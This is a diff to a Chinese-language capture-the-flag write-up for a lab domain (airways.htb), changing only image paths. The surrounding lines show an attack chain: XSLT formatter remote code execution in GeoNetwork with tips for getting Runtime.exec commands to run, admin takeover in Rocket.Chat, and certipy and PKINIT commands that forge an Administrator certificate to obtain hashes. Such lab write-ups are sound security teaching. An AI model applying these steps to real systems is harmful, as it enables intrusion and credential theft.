@@ -73,7 +73,7 @@ uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
 GN01
 ```
 
-![GeoNetwork formatter RCE：以 geonetwork(uid 999) 执行，以及同一通道读到的 notify.env](../../redeye/01-rce.png)
+![GeoNetwork formatter RCE：以 geonetwork(uid 999) 执行，以及同一通道读到的 notify.env](/redeye/01-rce.png)
 
 > **坑 1 · Saxon 会把没被引用的变量优化掉。** 一开始 `$p1` 定义了却没有 `<xsl:value-of>`，所有 exec 都“成功但没执行”；把变量输出到页面里才真正跑起来。
 > **坑 2 · `Runtime.exec` 的字符串会按空格切参数。** 直接写 `"/bin/bash -c id > /tmp/x"` 会被切成 `bash -c id`；要么命令里不放空格（`id>/tmp/x`），要么用 `${IFS}`。
@@ -186,7 +186,7 @@ owen.f: Done. Unlocked your account and reset the password to ChangeTempP4ss***!
 isabel.o: You're a lifesaver ... In now, changing it.
 ```
 
-![总线注入后注册的账号直接拿到 admin 角色，再用它在 owen 私信里读到 isabel 的临时密码](../../redeye/02-rocketchat-dm.png)
+![总线注入后注册的账号直接拿到 admin 角色，再用它在 owen 私信里读到 isabel 的临时密码](/redeye/02-rocketchat-dm.png)
 
 用这个密码做 Kerberos 认证：
 
@@ -257,7 +257,7 @@ certipy req -u isabel.o@airways.htb -k -no-pass \
 [*] Certificate object SID is 'S-1-5-21-...-500'
 ```
 
-![以 isabel.o 申请 User 模板，CA 按策略文件签出了一张写着 Administrator 与 SID -500 的证书](../../redeye/03-cert.png)
+![以 isabel.o 申请 User 模板，CA 按策略文件签出了一张写着 Administrator 与 SID -500 的证书](/redeye/03-cert.png)
 
 证书是 isabel 申请的，但身份是 Administrator。
 
@@ -268,7 +268,7 @@ certipy auth -pfx adm.pfx -password pass -username Administrator -domain airways
 # Got TGT / Got hash for 'administrator@airways.htb': aad3b...:c15cb8...
 ```
 
-![PKINIT：KDC 采信证书里的 SID，换回 Administrator 的 TGT 与 NT hash](../../redeye/04-pkinit.png)
+![PKINIT：KDC 采信证书里的 SID，换回 Administrator 的 TGT 与 NT hash](/redeye/04-pkinit.png)
 
 用 TGT 直接读域控桌面：
 
@@ -283,7 +283,7 @@ b = io.BytesIO(); c.getFile('C$', '\\Users\\Administrator\\Desktop\\root.txt', b
 3483...
 ```
 
-![用 ccache 经 SMB 读 DC01 的 C$\Users\Administrator\Desktop\root.txt（flag 已打码）](../../redeye/05-root.png)
+![用 ccache 经 SMB 读 DC01 的 C$\Users\Administrator\Desktop\root.txt（flag 已打码）](/redeye/05-root.png)
 
 ## 复盘：这条链真正难的地方
 
